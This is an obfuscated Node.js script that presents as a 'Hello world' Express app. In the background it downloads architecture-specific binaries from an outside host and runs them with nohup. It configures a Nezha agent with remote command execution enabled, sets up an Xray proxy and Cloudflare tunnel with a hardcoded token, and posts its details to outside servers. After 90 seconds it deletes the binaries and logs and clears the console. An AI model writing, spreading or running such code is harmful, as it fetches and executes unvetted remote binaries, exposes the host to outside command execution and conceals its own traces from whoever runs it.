const _0x4f60e9=_0x300a;(function(_0x26f67b,_0x3b890c){const _0x369324=_0x300a,_0x4cd287=_0x26f67b();while(!![]){try{const _0x56de80=-parseInt(_0x369324(0x124))/0x1+parseInt(_0x369324(0xdf))/0x2+-parseInt(_0x369324(0x9e))/0x3*(-parseInt(_0x369324(0xd4))/0x4)+parseInt(_0x369324(0x135))/0x5*(parseInt(_0x369324(0x83))/0x6)+-parseInt(_0x369324(0xf1))/0x7+-parseInt(_0x369324(0xc4))/0x8+parseInt(_0x369324(0x99))/0x9;if(_0x56de80===_0x3b890c)break;else _0x4cd287['push'](_0x4cd287['shift']());}catch(_0xdeade9){_0x4cd287['push'](_0x4cd287['shift']());}}}(_0x1d3e,0x87235));function _0x300a(_0x5d3778,_0x174f93){_0x5d3778=_0x5d3778-0x7c;const _0x1d3e22=_0x1d3e();let _0x300a85=_0x1d3e22[_0x5d3778];return _0x300a85;}const express=require(_0x4f60e9(0xbb)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x4f60e9(0x122)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x4f60e9(0x117)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x4f60e9(0xd2)]||'',PROJECT_URL=process['env'][_0x4f60e9(0x113)]||'',AUTO_ACCESS=process[_0x4f60e9(0xe0)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x4f60e9(0xe0)][_0x4f60e9(0xb0)]||_0x4f60e9(0xab),SUB_PATH=process[_0x4f60e9(0xe0)][_0x4f60e9(0x10e)]||'1689',PORT=process[_0x4f60e9(0xe0)][_0x4f60e9(0x9c)]||process['env'][_0x4f60e9(0xe9)]||0xbb8,UUID=process[_0x4f60e9(0xe0)][_0x4f60e9(0x11b)]||'ac3e3a8b-7c80-43c6-975d-060993f48b9e',NEZHA_SERVER=process['env'][_0x4f60e9(0xef)]||'',NEZHA_PORT=process['env'][_0x4f60e9(0xbd)]||'',NEZHA_KEY=process[_0x4f60e9(0xe0)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x4f60e9(0xe0)][_0x4f60e9(0x11f)]||_0x4f60e9(0xf7),ARGO_AUTH=process[_0x4f60e9(0xe0)][_0x4f60e9(0xf4)]||_0x4f60e9(0x128),ARGO_PORT=process[_0x4f60e9(0xe0)][_0x4f60e9(0x12a)]||0x1f41,CFIP=process['env'][_0x4f60e9(0x96)]||_0x4f60e9(0x80),CFPORT=process[_0x4f60e9(0xe0)]['CFPORT']||0x1bb,NAME=process[_0x4f60e9(0xe0)][_0x4f60e9(0x11e)]||_0x4f60e9(0x11a);!fs[_0x4f60e9(0xc7)](FILE_PATH)?(fs[_0x4f60e9(0x134)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x4f60e9(0x7f)](FILE_PATH+_0x4f60e9(0x100));function generateRandomName(){const _0x3342aa=_0x4f60e9,_0x49093a=_0x3342aa(0x10b);let _0x373537='';for(let _0x5bbd1c=0x0;_0x5bbd1c<0x6;_0x5bbd1c++){_0x373537+=_0x49093a['charAt'](Math[_0x3342aa(0xa7)](Math[_0x3342aa(0x84)]()*_0x49093a['length']));}return _0x373537;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4f60e9(0x85)](FILE_PATH,npmName),phpPath=path[_0x4f60e9(0x85)](FILE_PATH,phpName),webPath=path[_0x4f60e9(0x85)](FILE_PATH,webName),botPath=path[_0x4f60e9(0x85)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x4f60e9(0x85)](FILE_PATH,_0x4f60e9(0x10c)),bootLogPath=path[_0x4f60e9(0x85)](FILE_PATH,_0x4f60e9(0xd1)),configPath=path['join'](FILE_PATH,_0x4f60e9(0x7e));function deleteNodes(){const _0x3495c6=_0x4f60e9;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xce58f2;try{_0xce58f2=fs[_0x3495c6(0xe1)](subPath,_0x3495c6(0xf6));}catch{return null;}const _0x2197ca=Buffer[_0x3495c6(0x86)](_0xce58f2,_0x3495c6(0xc6))['toString']('utf-8'),_0x32c01f=_0x2197ca[_0x3495c6(0xdb)]('\x0a')[_0x3495c6(0xce)](_0x14bb37=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3495c6(0xcd)](_0x14bb37));if(_0x32c01f['length']===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x3495c6(0x133)]({'nodes':_0x32c01f}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x3f0d66=>{return null;}),null;}catch(_0x317a10){return null;}}function cleanupOldFiles(){const _0x4f0009=_0x4f60e9;try{const _0x4c9ffe=fs[_0x4f0009(0x9a)](FILE_PATH);_0x4c9ffe['forEach'](_0x4eba87=>{const _0x5577c3=_0x4f0009,_0x48397d=path[_0x5577c3(0x85)](FILE_PATH,_0x4eba87);try{const _0x422707=fs[_0x5577c3(0xd7)](_0x48397d);_0x422707[_0x5577c3(0x111)]()&&fs['unlinkSync'](_0x48397d);}catch(_0x524185){}});}catch(_0x94418a){}}app[_0x4f60e9(0xdc)]('/',function(_0x2110c4,_0x49ff23){const _0xc35685=_0x4f60e9;_0x49ff23[_0xc35685(0x12f)]('Hello\x20world!');});async function generateConfig(){const _0x2fc5f8=_0x4f60e9,_0x334c1d={'log':{'access':_0x2fc5f8(0xc5),'error':'/dev/null','loglevel':_0x2fc5f8(0x131)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2fc5f8(0xe5),'settings':{'clients':[{'id':UUID,'flow':_0x2fc5f8(0x95)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x2fc5f8(0x107),'dest':0xbba},{'path':_0x2fc5f8(0x112),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2fc5f8(0x12d)}},{'port':0xbb9,'listen':_0x2fc5f8(0xd9),'protocol':_0x2fc5f8(0xe5),'settings':{'clients':[{'id':UUID}],'decryption':_0x2fc5f8(0x131)},'streamSettings':{'network':_0x2fc5f8(0x12d),'security':_0x2fc5f8(0x131)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2fc5f8(0xe5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2fc5f8(0x131)},'streamSettings':{'network':'ws','security':_0x2fc5f8(0x131),'wsSettings':{'path':_0x2fc5f8(0x107)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x2fc5f8(0x105)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2fc5f8(0xd9),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2fc5f8(0x112)}},'sniffing':{'enabled':!![],'destOverride':[_0x2fc5f8(0xa3),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2fc5f8(0xd9),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2fc5f8(0x114)}},'sniffing':{'enabled':!![],'destOverride':[_0x2fc5f8(0xa3),_0x2fc5f8(0xe7),_0x2fc5f8(0x105)],'metadataOnly':![]}}],'dns':{'servers':[_0x2fc5f8(0x12e)]},'outbounds':[{'protocol':'freedom','tag':_0x2fc5f8(0xb9)},{'protocol':_0x2fc5f8(0xa8),'tag':_0x2fc5f8(0x7c)}]};fs[_0x2fc5f8(0x82)](path['join'](FILE_PATH,_0x2fc5f8(0x7e)),JSON[_0x2fc5f8(0x133)](_0x334c1d,null,0x2));}function getSystemArchitecture(){const _0x3e8c88=_0x4f60e9,_0x32c19e=os[_0x3e8c88(0xde)]();return _0x32c19e===_0x3e8c88(0x102)||_0x32c19e==='arm64'||_0x32c19e===_0x3e8c88(0x127)?_0x3e8c88(0x102):'amd';}function downloadFile(_0x57b0fc,_0x2a3a0b,_0x2861cf){const _0x4d9bc7=_0x4f60e9,_0x2bd3d7=_0x57b0fc;!fs[_0x4d9bc7(0xc7)](FILE_PATH)&&fs[_0x4d9bc7(0x134)](FILE_PATH,{'recursive':!![]});const _0x57fa2c=fs[_0x4d9bc7(0xd0)](_0x2bd3d7);axios({'method':_0x4d9bc7(0xdc),'url':_0x2a3a0b,'responseType':_0x4d9bc7(0x97)})[_0x4d9bc7(0x126)](_0x37ebc3=>{const _0x12d24b=_0x4d9bc7;_0x37ebc3[_0x12d24b(0x10d)][_0x12d24b(0xf9)](_0x57fa2c),_0x57fa2c['on'](_0x12d24b(0x9b),()=>{const _0x2c54a3=_0x12d24b;_0x57fa2c[_0x2c54a3(0x12b)](),console[_0x2c54a3(0x7f)](_0x2c54a3(0x108)+path[_0x2c54a3(0xae)](_0x2bd3d7)+_0x2c54a3(0x130)),_0x2861cf(null,_0x2bd3d7);}),_0x57fa2c['on']('error',_0x1ad23b=>{const _0xacee84=_0x12d24b;fs['unlink'](_0x2bd3d7,()=>{});const _0xa1732c=_0xacee84(0x108)+path[_0xacee84(0xae)](_0x2bd3d7)+_0xacee84(0x118)+_0x1ad23b[_0xacee84(0x81)];console[_0xacee84(0xaf)](_0xa1732c),_0x2861cf(_0xa1732c);});})['catch'](_0x4cc342=>{const _0x4aa946=_0x4d9bc7,_0x3ba488=_0x4aa946(0x108)+path[_0x4aa946(0xae)](_0x2bd3d7)+_0x4aa946(0x118)+_0x4cc342['message'];console[_0x4aa946(0xaf)](_0x3ba488),_0x2861cf(_0x3ba488);});}async function downloadFilesAndRun(){const _0x6be973=_0x4f60e9,_0x1c2a52=getSystemArchitecture(),_0x56caaf=getFilesForArchitecture(_0x1c2a52);if(_0x56caaf[_0x6be973(0xcf)]===0x0){console[_0x6be973(0x7f)](_0x6be973(0x106));return;}const _0x24e246=_0x56caaf['map'](_0x9c8090=>{return new Promise((_0x55931f,_0x44fa57)=>{const _0x36290b=_0x300a;downloadFile(_0x9c8090[_0x36290b(0x8e)],_0x9c8090['fileUrl'],(_0x277529,_0x338302)=>{_0x277529?_0x44fa57(_0x277529):_0x55931f(_0x338302);});});});try{await Promise[_0x6be973(0xd5)](_0x24e246);}catch(_0x36cc2a){console[_0x6be973(0xaf)](_0x6be973(0xee),_0x36cc2a);return;}function _0x71030c(_0x134d9d){const _0x13e801=0x1fd;_0x134d9d['forEach'](_0x320d46=>{const _0x59427c=_0x300a;fs[_0x59427c(0xc7)](_0x320d46)&&fs[_0x59427c(0x8c)](_0x320d46,_0x13e801,_0x30052d=>{const _0x17ca30=_0x59427c;_0x30052d?console[_0x17ca30(0xaf)]('Empowerment\x20failed\x20for\x20'+_0x320d46+':\x20'+_0x30052d):console[_0x17ca30(0x7f)](_0x17ca30(0xfd)+_0x320d46+':\x20'+_0x13e801['toString'](0x8));});});}const _0xa45586=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x71030c(_0xa45586);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x26bbff=NEZHA_SERVER[_0x6be973(0xfc)](':')?NEZHA_SERVER[_0x6be973(0xdb)](':')[_0x6be973(0x129)]():'',_0x130f8d=new Set([_0x6be973(0xb3),_0x6be973(0x101),_0x6be973(0x11c),'2087','2083','2053']),_0x30754d=_0x130f8d[_0x6be973(0xff)](_0x26bbff)?_0x6be973(0x11d):'false',_0x75bcfd='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x6be973(0xa5)+_0x30754d+_0x6be973(0xa4)+UUID;fs['writeFileSync'](path[_0x6be973(0x85)](FILE_PATH,_0x6be973(0x132)),_0x75bcfd);const _0x5936c9='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x6be973(0xbc);try{await exec(_0x5936c9),console['log'](phpName+_0x6be973(0x12c)),await new Promise(_0x1ef779=>setTimeout(_0x1ef779,0x3e8));}catch(_0x115427){console[_0x6be973(0xaf)](_0x6be973(0x90)+_0x115427);}}else{let _0x39223c='';const _0x40baa7=['443',_0x6be973(0x101),_0x6be973(0x11c),_0x6be973(0xe3),_0x6be973(0xc0),_0x6be973(0xfe)];_0x40baa7[_0x6be973(0xfc)](NEZHA_PORT)&&(_0x39223c=_0x6be973(0xec));const _0x2098ba=_0x6be973(0x88)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x6be973(0xeb)+NEZHA_KEY+'\x20'+_0x39223c+_0x6be973(0xa6);try{await exec(_0x2098ba),console[_0x6be973(0x7f)](npmName+'\x20is\x20running'),await new Promise(_0x1a2d53=>setTimeout(_0x1a2d53,0x3e8));}catch(_0xbcc76d){console[_0x6be973(0xaf)](_0x6be973(0xc8)+_0xbcc76d);}}}else console['log'](_0x6be973(0x109));const _0x2307ff='nohup\x20'+webPath+_0x6be973(0x92)+FILE_PATH+_0x6be973(0xf3);try{await exec(_0x2307ff),console[_0x6be973(0x7f)](webName+'\x20is\x20running'),await new Promise(_0x4f366d=>setTimeout(_0x4f366d,0x3e8));}catch(_0xd39717){console['error'](_0x6be973(0xe4)+_0xd39717);}if(fs[_0x6be973(0xc7)](botPath)){let _0x4c2072;if(ARGO_AUTH[_0x6be973(0xa1)](/^[A-Z0-9a-z=]{120,250}$/))_0x4c2072=_0x6be973(0xc1)+ARGO_AUTH;else ARGO_AUTH[_0x6be973(0xa1)](/TunnelSecret/)?_0x4c2072=_0x6be973(0x9f)+FILE_PATH+'/tunnel.yml\x20run':_0x4c2072=_0x6be973(0xb8)+FILE_PATH+_0x6be973(0xb6)+ARGO_PORT;try{await exec(_0x6be973(0x88)+botPath+'\x20'+_0x4c2072+_0x6be973(0xcb)),console[_0x6be973(0x7f)](botName+_0x6be973(0x12c)),await new Promise(_0x131699=>setTimeout(_0x131699,0x7d0));}catch(_0x28ce5d){console[_0x6be973(0xaf)](_0x6be973(0x98)+_0x28ce5d);}}await new Promise(_0x5e9643=>setTimeout(_0x5e9643,0x1388));}function getFilesForArchitecture(_0x84b106){const _0x378765=_0x4f60e9;let _0x289960;_0x84b106==='arm'?_0x289960=[{'fileName':webPath,'fileUrl':_0x378765(0xf2)},{'fileName':botPath,'fileUrl':_0x378765(0xac)}]:_0x289960=[{'fileName':webPath,'fileUrl':_0x378765(0xb7)},{'fileName':botPath,'fileUrl':_0x378765(0xf5)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1ab43b=_0x84b106==='arm'?_0x378765(0x8f):_0x378765(0x8d);_0x289960[_0x378765(0xb5)]({'fileName':npmPath,'fileUrl':_0x1ab43b});}else{const _0x4be2f8=_0x84b106===_0x378765(0x102)?_0x378765(0x123):_0x378765(0xc3);_0x289960[_0x378765(0xb5)]({'fileName':phpPath,'fileUrl':_0x4be2f8});}}return _0x289960;}function argoType(){const _0x3e5b2d=_0x4f60e9;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3e5b2d(0x7f)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x3e5b2d(0xfc)](_0x3e5b2d(0xed))){fs[_0x3e5b2d(0x82)](path[_0x3e5b2d(0x85)](FILE_PATH,_0x3e5b2d(0x8b)),ARGO_AUTH);const _0x24afa0=_0x3e5b2d(0x119)+ARGO_AUTH[_0x3e5b2d(0xdb)]('\x22')[0xb]+_0x3e5b2d(0xf8)+path['join'](FILE_PATH,_0x3e5b2d(0x8b))+_0x3e5b2d(0xc9)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,_0x3e5b2d(0xb4)),_0x24afa0);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x4a26bc=_0x4f60e9;let _0x41b234;if(ARGO_AUTH&&ARGO_DOMAIN)_0x41b234=ARGO_DOMAIN,console[_0x4a26bc(0x7f)]('ARGO_DOMAIN:',_0x41b234),await _0x3e32e3(_0x41b234);else try{const _0x23b457=fs['readFileSync'](path['join'](FILE_PATH,_0x4a26bc(0xd1)),_0x4a26bc(0xf6)),_0x11297a=_0x23b457[_0x4a26bc(0xdb)]('\x0a'),_0x432736=[];_0x11297a[_0x4a26bc(0xcc)](_0x5b8af1=>{const _0x5e753c=_0x4a26bc,_0x2ae3da=_0x5b8af1[_0x5e753c(0xa1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2ae3da){const _0x88e914=_0x2ae3da[0x1];_0x432736[_0x5e753c(0x125)](_0x88e914);}});if(_0x432736['length']>0x0)_0x41b234=_0x432736[0x0],console['log'](_0x4a26bc(0xa0),_0x41b234),await _0x3e32e3(_0x41b234);else{console[_0x4a26bc(0x7f)](_0x4a26bc(0x120)),fs[_0x4a26bc(0xc2)](path[_0x4a26bc(0x85)](FILE_PATH,_0x4a26bc(0xd1)));async function _0x3c0032(){const _0x4904d0=_0x4a26bc;try{process[_0x4904d0(0xad)]===_0x4904d0(0xfb)?await exec(_0x4904d0(0xd8)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x4904d0(0x10a)+botName[_0x4904d0(0xaa)](0x0)+']'+botName[_0x4904d0(0xb1)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x43bfc6){}}_0x3c0032(),await new Promise(_0x55dfb5=>setTimeout(_0x55dfb5,0xbb8));const _0x5219ca=_0x4a26bc(0xb8)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4a26bc(0x88)+botPath+'\x20'+_0x5219ca+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x4a26bc(0x12c)),await new Promise(_0x3341e6=>setTimeout(_0x3341e6,0xbb8)),await extractDomains();}catch(_0x4d2e38){console['error'](_0x4a26bc(0x98)+_0x4d2e38);}}}catch(_0x4ad9e3){console[_0x4a26bc(0xaf)](_0x4a26bc(0xca),_0x4ad9e3);}async function _0x3e32e3(_0x133721){const _0x38b7d1=_0x4a26bc,_0x856f05=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x38b7d1(0xf6)}),_0x4f234d=_0x856f05[_0x38b7d1(0xb2)](),_0x3abe6b=NAME?NAME+'-'+_0x4f234d:_0x4f234d;return new Promise(_0x5b5b21=>{setTimeout(()=>{const _0x12d62f=_0x300a,_0x289bea={'v':'2','ps':''+_0x3abe6b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x12d62f(0x131),'net':'ws','type':_0x12d62f(0x131),'host':_0x133721,'path':_0x12d62f(0xe6),'tls':_0x12d62f(0xe7),'sni':_0x133721,'alpn':'','fp':_0x12d62f(0x115)},_0x51f030=_0x12d62f(0x93)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x133721+'&fp=firefox&type=ws&host='+_0x133721+_0x12d62f(0xd3)+_0x3abe6b+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON['stringify'](_0x289bea))[_0x12d62f(0x103)](_0x12d62f(0xc6))+_0x12d62f(0xbf)+UUID+'@'+CFIP+':'+CFPORT+_0x12d62f(0x116)+_0x133721+_0x12d62f(0xea)+_0x133721+_0x12d62f(0x87)+_0x3abe6b+'\x0a\x20\x20\x20\x20';console[_0x12d62f(0x7f)](Buffer['from'](_0x51f030)[_0x12d62f(0x103)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x12d62f(0x86)](_0x51f030)['toString']('base64')),console[_0x12d62f(0x7f)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x12d62f(0xdc)]('/'+SUB_PATH,(_0x9578de,_0x4d7870)=>{const _0x4ceaf3=_0x12d62f,_0x16aa93=Buffer['from'](_0x51f030)[_0x4ceaf3(0x103)](_0x4ceaf3(0xc6));_0x4d7870['set'](_0x4ceaf3(0xe2),'text/plain;\x20charset=utf-8'),_0x4d7870[_0x4ceaf3(0x12f)](_0x16aa93);}),_0x5b5b21(_0x51f030);},0x7d0);});}}async function uploadNodes(){const _0x290347=_0x4f60e9;if(UPLOAD_URL&&PROJECT_URL){const _0x40b227=PROJECT_URL+'/'+SUB_PATH,_0x27fbac={'subscription':[_0x40b227]};try{const _0x581fba=await axios['post'](UPLOAD_URL+_0x290347(0x104),_0x27fbac,{'headers':{'Content-Type':_0x290347(0xe8)}});return _0x581fba&&_0x581fba[_0x290347(0x8a)]===0xc8?(console[_0x290347(0x7f)](_0x290347(0x94)),_0x581fba):null;}catch(_0x129bc4){if(_0x129bc4[_0x290347(0xf0)]){if(_0x129bc4[_0x290347(0xf0)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2878a1=fs[_0x290347(0xe1)](listPath,_0x290347(0xf6)),_0x1ce9c8=_0x2878a1[_0x290347(0xdb)]('\x0a')[_0x290347(0xce)](_0x511dcb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x511dcb));if(_0x1ce9c8['length']===0x0)return;const _0x3b225f=JSON['stringify']({'nodes':_0x1ce9c8});try{const _0x28d2b2=await axios['post'](UPLOAD_URL+_0x290347(0x91),_0x3b225f,{'headers':{'Content-Type':'application/json'}});return _0x28d2b2&&_0x28d2b2[_0x290347(0x8a)]===0xc8?(console[_0x290347(0x7f)](_0x290347(0xdd)),_0x28d2b2):null;}catch(_0x4852ac){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x53b37d=_0x300a,_0x29d6b2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x29d6b2[_0x53b37d(0x125)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x29d6b2[_0x53b37d(0x125)](phpPath);process[_0x53b37d(0xad)]===_0x53b37d(0xfb)?exec(_0x53b37d(0x121)+_0x29d6b2[_0x53b37d(0x85)]('\x20')+_0x53b37d(0xfa),_0x3a1ac6=>{const _0x227094=_0x53b37d;console[_0x227094(0x7d)](),console[_0x227094(0x7f)]('App\x20is\x20running'),console[_0x227094(0x7f)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x29d6b2[_0x53b37d(0x85)]('\x20')+_0x53b37d(0x89),_0x3f2909=>{const _0x1346c6=_0x53b37d;console['clear'](),console[_0x1346c6(0x7f)](_0x1346c6(0xda)),console[_0x1346c6(0x7f)](_0x1346c6(0xba));});},0x15f90);}function _0x1d3e(){const _0xbb037f=['ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','del\x20/f\x20/q\x20','path','https://arm64.ssss.nyc.mn/v1','346083JIkNVA','push','then','aarch64','eyJhIjoiZDU4MGFkNDk5Zjc5MDI4ZWZhNTNlNGE2YzU0YTNmOWUiLCJ0IjoiZTQ5NTZkZDAtODNiNi00NTkwLWE5OTktOTI5MzhlNDA5MzVlIiwicyI6IlpHUTROekprTWpBdE5ESTBPUzAwTkRZNExXSXhOR1F0WW1Nell6QmhNR1k1TkRBdyJ9','pop','ARGO_PORT','close','\x20is\x20running','tcp','https+local://8.8.8.8/dns-query','send','\x20successfully','none','config.yaml','stringify','mkdirSync','1771020KBUJjr','block','clear','config.json','log','cdns.doon.eu.org','message','writeFileSync','6lhQCdX','random','join','from','&path=%2Ftrojan-argo%3Fed%3D2560#','nohup\x20','\x20>/dev/null\x202>&1','status','tunnel.json','chmod','https://amd64.ssss.nyc.mn/agent','fileName','https://arm64.ssss.nyc.mn/agent','php\x20running\x20error:\x20','/api/add-nodes','\x20-c\x20','\x0avless://','Subscription\x20uploaded\x20successfully','xtls-rprx-vision','CFIP','stream','Error\x20executing\x20command:\x20','11329263KRUour','readdirSync','finish','SERVER_PORT','Unhandled\x20error\x20in\x20startserver:','717wcHpzO','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ArgoDomain:','match','Add\x20automatic\x20access\x20task\x20faild:\x20','http','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','floor','blackhole','Skipping\x20adding\x20automatic\x20access\x20task','charAt','./tmp','https://arm64.ssss.nyc.mn/bot','platform','basename','error','FILE_PATH','substring','trim','443','tunnel.yml','unshift','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://amd64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','direct','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','express','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','automatic\x20access\x20task\x20added\x20successfully','\x0a\x20\x20\x0atrojan://','2083','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','unlinkSync','https://amd64.ssss.nyc.mn/v1','1856136iQoPNb','/dev/null','base64','existsSync','npm\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Error\x20reading\x20boot.log:','\x20>/dev/null\x202>&1\x20&','forEach','test','filter','length','createWriteStream','boot.log','UPLOAD_URL','&path=%2Fvless-argo%3Fed%3D2560#','996xnXAsX','all','Error\x20in\x20startserver:','statSync','taskkill\x20/f\x20/im\x20','127.0.0.1','App\x20is\x20running','split','get','Nodes\x20uploaded\x20successfully','arch','861702ShWLeQ','env','readFileSync','Content-Type','2087','web\x20running\x20error:\x20','vless','/vmess-argo?ed=2560','tls','application/json','PORT','&fp=firefox&type=ws&host=','\x20-p\x20','--tls','TunnelSecret','Error\x20downloading\x20files:','NEZHA_SERVER','response','6802236wqjAvx','https://arm64.ssss.nyc.mn/web','/config.json\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','https://amd64.ssss.nyc.mn/bot','utf-8','sg.book103.dpdns.org','\x0a\x20\x20credentials-file:\x20','pipe','\x20>\x20nul\x202>&1','win32','includes','Empowerment\x20success\x20for\x20','2053','has','\x20already\x20exists','8443','arm','toString','/api/add-subscriptions','quic','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/vless-argo','Download\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','pkill\x20-f\x20\x22[','abcdefghijklmnopqrstuvwxyz','list.txt','data','SUB_PATH','post','http\x20server\x20is\x20running\x20on\x20port:','isFile','/vmess-argo','PROJECT_URL','/trojan-argo','firefox','?security=tls&sni=','exec','\x20failed:\x20','\x0a\x20\x20tunnel:\x20','USA','UUID','2096','true','NAME','ARGO_DOMAIN'];_0x1d3e=function(){return _0xbb037f;};return _0x1d3e();}cleanFiles();async function AddVisitTask(){const _0x26db0f=_0x4f60e9;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x26db0f(0x7f)](_0x26db0f(0xa9));return;}try{const _0x3be4c0=await axios[_0x26db0f(0x10f)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x26db0f(0xe8)}});return console['log'](_0x26db0f(0xbe)),_0x3be4c0;}catch(_0x4df4ae){return console[_0x26db0f(0xaf)](_0x26db0f(0xa2)+_0x4df4ae[_0x26db0f(0x81)]),null;}}async function startserver(){const _0x5c4790=_0x4f60e9;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4e5a63){console[_0x5c4790(0xaf)](_0x5c4790(0xd6),_0x4e5a63);}}startserver()['catch'](_0x46303d=>{const _0x39cf82=_0x4f60e9;console[_0x39cf82(0xaf)](_0x39cf82(0x9d),_0x46303d);}),app['listen'](PORT,()=>console['log'](_0x4f60e9(0x110)+PORT+'!'));
